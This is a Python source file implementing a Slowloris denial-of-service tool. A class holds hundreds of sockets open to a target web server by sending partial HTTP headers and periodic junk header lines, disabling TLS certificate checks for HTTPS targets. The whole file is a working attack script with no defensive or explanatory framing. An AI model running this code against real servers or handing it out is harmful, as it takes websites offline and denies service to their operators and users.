"""
Slowloris — partial headers, keep sockets open, exhaust worker pool.
Non-root. Pure sockets. Partial header trick.
"""
import random
import socket
import ssl
import time
import threading


class Slowloris:
    def __init__(self, host, port=80, sockets=200, duration=120, https=False):
        self.host = host
        self.port = port
        self.count = sockets
        self.duration = duration
        self.https = https
        self.conns = []
        self._stop = False

    def _init_sock(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((self.host, self.port))
        if self.https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
        s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {self.host}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0\r\n")
        s.send(b"Accept-Language: en-US,en;q=0.5\r\n")
        return s

    def _tick(self):
        while not self._stop:
            for s in list(self.conns):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    self.conns.remove(s)
                    try:
                        s.close()
                    except Exception:
                        pass
            while len(self.conns) < self.count and not self._stop:
                try:
                    self.conns.append(self._init_sock())
                except Exception:
                    break
            time.sleep(5)

    def run(self):
        t = threading.Thread(target=self._tick, daemon=True)
        t.start()
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        self._stop = True
        for s in self.conns:
            try:
                s.close()
            except Exception:
                pass
        return {"held": len(self.conns)}
